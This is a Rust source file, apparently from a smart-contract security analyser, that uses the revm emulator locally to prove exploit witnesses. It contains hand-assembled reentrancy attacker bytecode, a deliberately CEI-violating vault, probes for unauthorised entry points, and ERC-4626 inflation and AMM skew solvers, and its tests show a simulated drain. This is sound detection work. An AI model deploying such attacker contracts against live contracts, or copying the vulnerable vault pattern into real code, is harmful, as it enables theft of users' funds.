use revm::{
    Context, ExecuteCommitEvm, MainBuilder, MainContext,
    context::TxEnv,
    context_interface::result::{ExecutionResult, Output},
    database::InMemoryDB,
    primitives::{Address, Bytes, TxKind, U256},
    state::{AccountInfo, Bytecode},
};

#[derive(Debug, Clone)]
pub struct RevmWitnessResult {
    pub proven: bool,
    pub drained_wei: U256,
    pub profit_wei: U256,
    pub gas_used: u64,
    pub summary: String,
}

#[derive(Debug, Clone)]
pub struct CallProbeSpec {
    pub caller: Address,
    pub target: Address,
    pub value: U256,
    pub data: Vec<u8>,
}

/// Account initial state `(address, balance_wei, optional_deployed_bytecode, initial_storage_slots)`.
pub type AccountSeed = (Address, U256, Option<Vec<u8>>, Vec<(U256, U256)>);

const ATTACKER_ADDR: Address = Address::new([
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x10, 0x00,
]);
const VICTIM_ADDR: Address = Address::new([
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x20, 0x00,
]);
const EOA_ADDR: Address = Address::new([
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x30, 0x00,
]);

/// Builds runtime EVM bytecode for an attacker relay contract that calls/re-enters `VICTIM_ADDR` (0x2000)
/// up to `max_calls` times tracked in storage slot `0`.
fn build_reentrant_attacker_bytecode(max_calls: u8) -> Vec<u8> {
    vec![
        0x60, 0x00, 0x54, // 0..3: PUSH1 0, SLOAD
        0x80, // 3: DUP1
        0x60, max_calls, // 4..6: PUSH1 max_calls
        0x11,      // 6: GT (max_calls > cnt)
        0x15,      // 7: ISZERO (cnt >= max_calls)
        0x60, 0x23, // 8..10: PUSH1 0x23
        0x57, // 10: JUMPI
        0x60, 0x01, 0x01, // 11..14: PUSH1 1, ADD
        0x60, 0x00, 0x55, // 14..17: PUSH1 0, SSTORE
        0x60, 0x00, // 17..19: retSize
        0x60, 0x00, // 19..21: retOff
        0x60, 0x00, // 21..23: argSize
        0x60, 0x00, // 23..25: argOff
        0x60, 0x00, // 25..27: value
        0x61, 0x20, 0x00, // 27..30: PUSH2 0x2000 (Victim)
        0x62, 0x07, 0xa1, 0x20, // 30..34: PUSH3 500_000 gas
        0xf1, // 34: CALL
        0x50, 0x5b, 0x00,
    ]
}

fn patched_reentrant_attacker_bytecode(max_calls: u8) -> Vec<u8> {
    let mut code = build_reentrant_attacker_bytecode(max_calls);
    let jd_pc = (code.len() - 2) as u8;
    code[9] = jd_pc;
    code
}

/// Builds a minimal vault withdraw bytecode:
/// - `cei_safe == false`: transfers `slot[0]` via `CALL` BEFORE setting `SSTORE(0, 0)` (reentrant!).
/// - `cei_safe == true`: updates `SSTORE(0, 0)` BEFORE `CALL` (CEI hardened).
fn build_vault_bytecode(cei_safe: bool) -> Vec<u8> {
    if !cei_safe {
        vec![
            0x60, 0x00, 0x54, 0x80, 0x15, 0x60, 0x1f, 0x57, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00,
            0x60, 0x00, 0x84, 0x33, 0x62, 0x07, 0xa1, 0x20, 0xf1, 0x50, 0x50, 0x60, 0x00, 0x60,
            0x00, 0x55, 0x00, 0x5b, 0x50, 0x00,
        ]
    } else {
        vec![
            0x60, 0x00, 0x54, 0x80, 0x15, 0x60, 0x1f, 0x57, 0x60, 0x00, 0x60, 0x00, 0x55, 0x60,
            0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x84, 0x33, 0x62, 0x07, 0xa1, 0x20, 0xf1,
            0x50, 0x50, 0x00, 0x5b, 0x50, 0x00,
        ]
    }
}

/// Runs a concrete multi-tx EVM sequence inside in-process `revm` (`InMemoryDB`) and returns final account balances.
pub fn execute_revm_sequence(
    accounts: Vec<AccountSeed>,
    txs: &[CallProbeSpec],
) -> Result<(u64, Vec<bool>, InMemoryDB), String> {
    let mut db = InMemoryDB::default();
    for (addr, bal, code_opt, slots) in accounts {
        let info = AccountInfo {
            balance: bal,
            code: code_opt.map(|c| Bytecode::new_raw(Bytes::from(c))),
            ..Default::default()
        };
        db.insert_account_info(addr, info);
        for (k, v) in slots {
            db.insert_account_storage(addr, k, v)
                .map_err(|e| format!("{e:?}"))?;
        }
    }

    let mut evm = Context::mainnet().with_db(db).build_mainnet();
    let mut nonces: std::collections::HashMap<Address, u64> = std::collections::HashMap::new();
    let mut total_gas = 0u64;
    let mut outcomes = Vec::with_capacity(txs.len());

    for spec in txs {
        let nonce_entry = nonces.entry(spec.caller).or_insert(0);
        let tx = TxEnv {
            caller: spec.caller,
            kind: TxKind::Call(spec.target),
            gas_limit: 5_000_000,
            gas_price: 0,
            value: spec.value,
            data: Bytes::from(spec.data.clone()),
            nonce: *nonce_entry,
            ..Default::default()
        };
        *nonce_entry += 1;
        let res = evm
            .transact_commit(tx)
            .map_err(|e| format!("revm tx failed: {e:?}"))?;
        match res {
            ExecutionResult::Success { gas, .. } => {
                total_gas = total_gas.saturating_add(gas.tx_gas_used());
                outcomes.push(true);
            }
            ExecutionResult::Revert { gas, .. } => {
                total_gas = total_gas.saturating_add(gas.tx_gas_used());
                outcomes.push(false);
            }
            ExecutionResult::Halt { gas, .. } => {
                total_gas = total_gas.saturating_add(gas.tx_gas_used());
                outcomes.push(false);
            }
        }
    }
    Ok((total_gas, outcomes, evm.ctx.journaled_state.database))
}

/// Executes a concrete reentrancy exploit witness inside `revm` against either CEI-violating or CEI-safe EVM bytecode.
/// Returns `proven = true` strictly when repeated reentrant invocations drain strictly more than the initial 1 ETH credit.
pub fn verify_reentrancy_in_revm(has_cei_or_mutex: bool) -> RevmWitnessResult {
    let one_eth = U256::from(1_000_000_000_000_000_000u128);
    let five_eth = U256::from(5_000_000_000_000_000_000u128);

    let vault_code = build_vault_bytecode(has_cei_or_mutex);
    let attacker_code = patched_reentrant_attacker_bytecode(3);

    let accounts = vec![
        (EOA_ADDR, one_eth, None, vec![]),
        (
            VICTIM_ADDR,
            five_eth,
            Some(vault_code),
            vec![(U256::ZERO, one_eth)],
        ),
        (ATTACKER_ADDR, U256::ZERO, Some(attacker_code), vec![]),
    ];
    let txs = vec![CallProbeSpec {
        caller: EOA_ADDR,
        target: ATTACKER_ADDR,
        value: U256::ZERO,
        data: Vec::new(),
    }];

    match execute_revm_sequence(accounts, &txs) {
        Ok((gas_used, outcomes, db)) => {
            let attacker_final = db
                .cache
                .accounts
                .get(&ATTACKER_ADDR)
                .map(|a| a.info.balance)
                .unwrap_or(U256::ZERO);
            let victim_final = db
                .cache
                .accounts
                .get(&VICTIM_ADDR)
                .map(|a| a.info.balance)
                .unwrap_or(five_eth);
            let drained = five_eth.saturating_sub(victim_final);
            let profit = attacker_final.saturating_sub(one_eth);
            let ok = outcomes.first().copied().unwrap_or(false) && profit > U256::ZERO;
            RevmWitnessResult {
                proven: ok,
                drained_wei: drained,
                profit_wei: profit,
                gas_used,
                summary: if ok {
                    format!(
                        "revm concrete reentrancy drained {drained} wei (net attacker gain +{profit} wei over 1 ETH credit, gas={gas_used})"
                    )
                } else {
                    format!(
                        "revm execution blocked reentrant multi-drain (drained={drained} wei, gas={gas_used})"
                    )
                },
            }
        }
        Err(err) => RevmWitnessResult {
            proven: false,
            drained_wei: U256::ZERO,
            profit_wei: U256::ZERO,
            gas_used: 0,
            summary: format!("revm execution unavailable: {err}"),
        },
    }
}

/// Builds attacker relay bytecode forwarding arbitrary `EOA` calldata (`CALLDATASIZE > 0`) to `VICTIM_ADDR`,
/// and on fallback (`CALLDATASIZE == 0`) re-entering `VICTIM_ADDR` with `reenter_calldata` up to `max_calls` times.
fn build_forwarding_reentrant_attacker(max_calls: u8, reenter_calldata: &[u8]) -> Vec<u8> {
    let mut code = Vec::new();
    // If CALLDATASIZE > 0, jump to forwarder (`fwd_pc` placeholder at idx 5)
    code.extend_from_slice(&[0x36, 0x15, 0x15, 0x61, 0x00, 0x00, 0x57]);

    // Callback / direct re-entry path: check slot[0] < max_calls
    let stop_placeholder_idx = code.len() + 9;
    code.extend_from_slice(&[
        0x60, 0x00, 0x54, // PUSH1 0, SLOAD
        0x80, 0x60, max_calls, 0x11, 0x15, // DUP1, PUSH1 max_calls, GT, ISZERO
        0x61, 0x00, 0x00, 0x57, // PUSH2 stop_pc (+9..+11), JUMPI
        0x60, 0x01, 0x01, 0x60, 0x00, 0x55, // slot[0] += 1
    ]);

    // Store reenter_calldata words into memory at 0..
    for (chunk_idx, chunk) in reenter_calldata.chunks(32).enumerate() {
        let mut word = [0u8; 32];
        word[..chunk.len()].copy_from_slice(chunk);
        code.push(0x7f); // PUSH32
        code.extend_from_slice(&word);
        let mem_off = (chunk_idx * 32) as u8;
        code.extend_from_slice(&[0x60, mem_off, 0x52]); // PUSH1 off, MSTORE
    }
    let cd_len = reenter_calldata.len() as u16;
    code.extend_from_slice(&[0x60, 0x00, 0x60, 0x00]); // retSize=0, retOff=0
    code.push(0x61);
    code.extend_from_slice(&cd_len.to_be_bytes()); // argSize
    code.extend_from_slice(&[0x60, 0x00, 0x60, 0x00]); // argOff=0, value=0
    code.extend_from_slice(&[0x61, 0x20, 0x00]); // VICTIM_ADDR
    code.extend_from_slice(&[0x62, 0x0c, 0x35, 0x00, 0xf1, 0x50, 0x00]); // PUSH3 800_000, CALL, POP, STOP

    // Patch forwarder offset (`fwd_pc`)
    let fwd_pc = code.len() as u16;
    code[4..6].copy_from_slice(&fwd_pc.to_be_bytes());
    code.extend_from_slice(&[
        0x5b, // JUMPDEST (forwarder)
        0x36, 0x60, 0x00, 0x60, 0x00, 0x37, // CALLDATASIZE, PUSH1 0, PUSH1 0, CALLDATACOPY
        0x60, 0x00, 0x60, 0x00, 0x36, 0x60, 0x00,
        0x34, // retSz, retOff, argSz=CALLDATASIZE, argOff=0, CALLVALUE
        0x61, 0x20, 0x00, // VICTIM_ADDR
        0x62, 0x1e, 0x84, 0x80, 0xf1, // PUSH3 2_000_000, CALL
        0x50, // POP ok
    ]);

    let stop_pc = code.len() as u16;
    code[stop_placeholder_idx..stop_placeholder_idx + 2].copy_from_slice(&stop_pc.to_be_bytes());
    code.extend_from_slice(&[0x5b, 0x00]); // JUMPDEST; STOP
    code
}

/// Probes real compiled Foundry/solc `deployed_bytecode` for ETH drain reentrancy inside in-process `revm`.
pub fn probe_compiled_reentrancy_in_revm(
    deployed_bytecode: &[u8],
    deposit_sel: Option<[u8; 4]>,
    withdraw_calldata: &[u8],
) -> RevmWitnessResult {
    if deployed_bytecode.is_empty() {
        return RevmWitnessResult {
            proven: false,
            drained_wei: U256::ZERO,
            profit_wei: U256::ZERO,
            gas_used: 0,
            summary: "no compiled target bytecode".into(),
        };
    }
    let one_eth = U256::from(1_000_000_000_000_000_000u128);
    let five_eth = U256::from(5_000_000_000_000_000_000u128);
    let attacker_code = build_forwarding_reentrant_attacker(3, withdraw_calldata);

    let accounts = vec![
        (EOA_ADDR, five_eth, None, vec![]),
        (
            VICTIM_ADDR,
            five_eth,
            Some(deployed_bytecode.to_vec()),
            vec![],
        ),
        (ATTACKER_ADDR, U256::ZERO, Some(attacker_code), vec![]),
    ];

    let mut txs = Vec::new();
    let mut initial_deposit = U256::ZERO;
    if let Some(dsel) = deposit_sel {
        initial_deposit = one_eth;
        txs.push(CallProbeSpec {
            caller: EOA_ADDR,
            target: ATTACKER_ADDR,
            value: one_eth,
            data: dsel.to_vec(),
        });
    }
    txs.push(CallProbeSpec {
        caller: EOA_ADDR,
        target: ATTACKER_ADDR,
        value: U256::ZERO,
        data: Vec::new(),
    });

    match execute_revm_sequence(accounts, &txs) {
        Ok((gas_used, _, db)) => {
            let attacker_final = db
                .cache
                .accounts
                .get(&ATTACKER_ADDR)
                .map(|a| a.info.balance)
                .unwrap_or(U256::ZERO);
            let profit = attacker_final.saturating_sub(initial_deposit);
            let victim_final = db
                .cache
                .accounts
                .get(&VICTIM_ADDR)
                .map(|a| a.info.balance)
                .unwrap_or(five_eth.saturating_add(initial_deposit));
            let drained = five_eth
                .saturating_add(initial_deposit)
                .saturating_sub(victim_final);
            let ok = profit > U256::ZERO;
            RevmWitnessResult {
                proven: ok,
                drained_wei: drained,
                profit_wei: profit,
                gas_used,
                summary: if ok {
                    format!(
                        "revm PROVEN against compiled bytecode: drained +{profit} wei net profit (gas={gas_used})"
                    )
                } else {
                    format!(
                        "compiled bytecode probe finished with 0 net attacker gain (gas={gas_used})"
                    )
                },
            }
        }
        Err(err) => RevmWitnessResult {
            proven: false,
            drained_wei: U256::ZERO,
            profit_wei: U256::ZERO,
            gas_used: 0,
            summary: format!("revm compiled probe error: {err}"),
        },
    }
}

/// Probes compiled `deployed_bytecode` (from Foundry/solc `out/*.json`) as an unprivileged caller (`EOA_ADDR`)
/// to witness whether a supposedly privileged selector succeeds and mutates EVM storage/balance without reverting.
pub fn probe_compiled_selector_unauth(
    deployed_bytecode: &[u8],
    selector: [u8; 4],
    extra_arg_32: Option<[u8; 32]>,
) -> Result<(bool, usize, u64), String> {
    if deployed_bytecode.is_empty() {
        return Ok((false, 0, 0));
    }
    let one_eth = U256::from(1_000_000_000_000_000_000u128);
    let target = VICTIM_ADDR;
    let mut calldata = selector.to_vec();
    if let Some(arg) = extra_arg_32 {
        calldata.extend_from_slice(&arg);
    }

    let mut db = InMemoryDB::default();
    db.insert_account_info(
        EOA_ADDR,
        AccountInfo {
            balance: one_eth,
            ..Default::default()
        },
    );
    db.insert_account_info(
        target,
        AccountInfo {
            balance: one_eth,
            code: Some(Bytecode::new_raw(Bytes::from(deployed_bytecode.to_vec()))),
            ..Default::default()
        },
    );
    let mut evm = Context::mainnet().with_db(db).build_mainnet();
    let tx = TxEnv {
        caller: EOA_ADDR,
        kind: TxKind::Call(target),
        gas_limit: 5_000_000,
        data: Bytes::from(calldata),
        ..Default::default()
    };
    let res = evm
        .transact_commit(tx)
        .map_err(|e| format!("revm selector probe error: {e:?}"))?;
    let db = evm.ctx.journaled_state.database;
    // Count only storage slots whose committed value actually changed from initial 0 (ignoring SLOAD or no-op SSTORE(k, 0))
    let storage_writes = db
        .cache
        .accounts
        .get(&target)
        .map(|a| {
            let mut changed = a.storage.values().filter(|&&v| v != U256::ZERO).count();
            if a.info.balance != one_eth {
                changed += 1;
            }
            changed
        })
        .unwrap_or(0);
    match res {
        ExecutionResult::Success { gas, .. } => Ok((true, storage_writes, gas.tx_gas_used())),
        ExecutionResult::Revert { gas, .. } | ExecutionResult::Halt { gas, .. } => {
            Ok((false, storage_writes, gas.tx_gas_used()))
        }
    }
}

/// Checks if a bytecode deployment sequence with constructor initcode returns valid runtime code cleanly inside `revm`.
pub fn deploy_initcode_in_revm(creation_bytecode: &[u8]) -> Option<Address> {
    if creation_bytecode.is_empty() {
        return None;
    }
    let one_eth = U256::from(1_000_000_000_000_000_000u128);
    let mut db = InMemoryDB::default();
    db.insert_account_info(
        EOA_ADDR,
        AccountInfo {
            balance: one_eth,
            ..Default::default()
        },
    );
    let mut evm = Context::mainnet().with_db(db).build_mainnet();
    let tx = TxEnv {
        caller: EOA_ADDR,
        kind: TxKind::Create,
        gas_limit: 5_000_000,
        data: Bytes::from(creation_bytecode.to_vec()),
        ..Default::default()
    };
    match evm.transact_commit(tx).ok()? {
        ExecutionResult::Success {
            output: Output::Create(_, addr),
            ..
        } => addr,
        _ => None,
    }
}

/// Bounded ERC-4626 first-depositor rational rounding witness solver:
/// Finds concrete `(deposit_wei, donation_wei)` causing `floor(deposit * total_supply / total_assets) == 0`
/// when initial `total_supply = 1`, `total_assets = 1 + donation_wei`.
pub fn solve_erc4626_inflation_witness(deposit_wei: u128) -> Option<u128> {
    if deposit_wei == 0 {
        return None;
    }
    let total_supply = 1u128;
    for exp in [6u32, 12, 15, 18, 21, 24] {
        let donation = 10u128.checked_pow(exp)?;
        let total_assets = 1u128.saturating_add(donation);
        let minted_shares = deposit_wei.saturating_mul(total_supply) / total_assets;
        if minted_shares == 0 {
            return Some(donation);
        }
    }
    None
}

/// Bounded 2-step AMM constant-product x*y=k spot-price skew check (`k <= 2` swaps) using 256-bit `U256` arithmetic
/// so 18-decimal ERC-20 reserves (`10^24` wei) never saturate `u128::MAX`.
pub fn check_amm_spot_skew_bps(r0: u128, r1: u128, flash_dx: u128) -> u128 {
    if r0 == 0 || r1 == 0 || flash_dx == 0 {
        return 0;
    }
    let r0_u = U256::from(r0);
    let r1_u = U256::from(r1);
    let dx_u = U256::from(flash_dx);
    let k = r0_u.saturating_mul(r1_u);
    let new_r0 = r0_u.saturating_add(dx_u);
    if new_r0.is_zero() {
        return 0;
    }
    let new_r1 = k / new_r0;
    // Spot price of token0 in token1 dropped from (r1/r0) to (new_r1/new_r0): skew = 1 - (new_r1*r0)/(r1*new_r0)
    let orig_cross = r1_u.saturating_mul(new_r0);
    let new_cross = new_r1.saturating_mul(r0_u);
    if orig_cross.is_zero() || new_cross >= orig_cross {
        return 0;
    }
    let bps = orig_cross
        .saturating_sub(new_cross)
        .saturating_mul(U256::from(10_000u64))
        / orig_cross;
    u128::try_from(bps).unwrap_or(10_000)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn revm_concrete_reentrancy_proves_drain_and_cei_blocks_it() {
        let vuln = verify_reentrancy_in_revm(false);
        assert!(vuln.proven, "expected revm to prove drain: {:?}", vuln);
        assert_eq!(
            vuln.drained_wei,
            U256::from(3_000_000_000_000_000_000u128),
            "expected 3 reentrant 1-ETH withdrawals"
        );
        assert_eq!(
            vuln.profit_wei,
            U256::from(2_000_000_000_000_000_000u128),
            "expected +2 ETH pure attacker profit"
        );

        let safe = verify_reentrancy_in_revm(true);
        assert!(!safe.proven, "CEI-safe bytecode must block multi-drain");
        assert_eq!(safe.profit_wei, U256::ZERO);
    }

    #[test]
    fn revm_unauth_selector_probe_detects_mutating_unprotected_entrypoint_and_ignores_sload() {
        // Deployed bytecode: PUSH1 0x42, PUSH1 0x00, SSTORE, STOP
        let vuln_code = vec![0x60, 0x42, 0x60, 0x00, 0x55, 0x00];
        let (ok, writes, _) =
            probe_compiled_selector_unauth(&vuln_code, [0xc4, 0xd6, 0x6d, 0xe8], None).unwrap();
        assert!(ok);
        assert_eq!(writes, 1);

        // Read-only SLOAD bytecode: PUSH1 0x00, SLOAD, POP, STOP (must report 0 storage writes!)
        let sload_only_code = vec![0x60, 0x00, 0x54, 0x50, 0x00];
        let (ok_ro, writes_ro, _) =
            probe_compiled_selector_unauth(&sload_only_code, [0xc4, 0xd6, 0x6d, 0xe8], None)
                .unwrap();
        assert!(ok_ro);
        assert_eq!(writes_ro, 0);

        // Guarded bytecode: CALLER, ISZERO, REVERT (immediately reverts for unauth caller)
        let guarded_code = vec![0x33, 0x60, 0x00, 0x60, 0x00, 0xfd];
        let (ok2, writes2, _) =
            probe_compiled_selector_unauth(&guarded_code, [0xc4, 0xd6, 0x6d, 0xe8], None).unwrap();
        assert!(!ok2);
        assert_eq!(writes2, 0);
    }

    #[test]
    fn erc4626_and_amm_witness_solvers_handle_18_decimal_reserves_without_overflow() {
        let donation = solve_erc4626_inflation_witness(100_000_000_000_000_000).unwrap();
        assert!(donation >= 100_000_000_000_000_000);
        let skew = check_amm_spot_skew_bps(1_000_000, 1_000_000, 500_000);
        assert!(skew > 5_000);

        // Counterexample WEB3-07: 18-decimal reserves (10^24 wei) where r0 * r1 = 10^48 > u128::MAX
        let r_18dec = 1_000_000_000_000_000_000_000_000u128; // 10^24 wei
        let skew_18dec = check_amm_spot_skew_bps(r_18dec, r_18dec, r_18dec / 2);
        assert_eq!(skew_18dec, 5_555);
    }
}
